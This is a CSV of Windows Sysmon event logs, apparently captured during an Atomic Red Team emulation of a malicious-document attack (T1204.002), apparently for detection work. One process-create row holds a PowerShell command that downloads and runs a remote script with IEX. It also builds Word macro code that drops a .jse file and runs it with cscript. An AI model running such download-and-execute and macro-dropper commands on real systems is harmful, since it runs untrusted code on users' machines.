process,winlog,@timestamp,file
"{'parent': {'name': 'powershell.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" '}, 'name': 'whoami.exe', 'command_line': '""C:\\Windows\\system32\\whoami.exe""'}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:51.091Z,
"{'parent': {'name': 'powershell.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" '}, 'name': 'powershell.exe', 'command_line': '""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \\""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\"""" -UseBasicParsing)\n$macrocode = \\""""   Open `\\""""C:\\Users\\Public\\art.jse`\\"""" For Output As #1`n   Write #1, `\\""""WScript.Quit`\\""""`n   Close #1`n   Shell`$ `\\""""cscript.exe C:\\Users\\Public\\art.jse`\\""""`n\\""""\nInvoke-MalDoc -macroCode $macrocode -officeProduct \\""""Word\\""""}'}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:12:51.632Z,
{'name': 'powershell.exe'},{'task': 'File created (rule: FileCreate)'},2025-03-26T17:12:56.988Z,{'path': 'C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.687Z,{'path': 'C:\\Windows\\System32\\mscoree.dll'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.687Z,{'path': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.687Z,{'path': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.687Z,{'path': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\3597805b7d7dce423abb491985dd28e8\\mscorlib.ni.dll'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.720Z,{'path': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\8861280fa67d054530cfebe1fa86e29f\\System.Management.Automation.ni.dll'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.756Z,{'path': 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpOAV.dll'}
{'name': 'powershell.exe'},{'task': 'File created (rule: FileCreate)'},2025-03-26T17:12:51.788Z,{'path': 'C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wu324lrz.ebf.ps1'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.801Z,{'path': 'C:\\Windows\\System32\\urlmon.dll'}
{'name': 'powershell.exe'},{'task': 'File Delete archived (rule: FileDelete)'},2025-03-26T17:12:51.816Z,{'path': 'C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wu324lrz.ebf.ps1'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.864Z,{'path': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll'}
{'name': 'powershell.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:12:51.924Z,{'path': 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpClient.dll'}
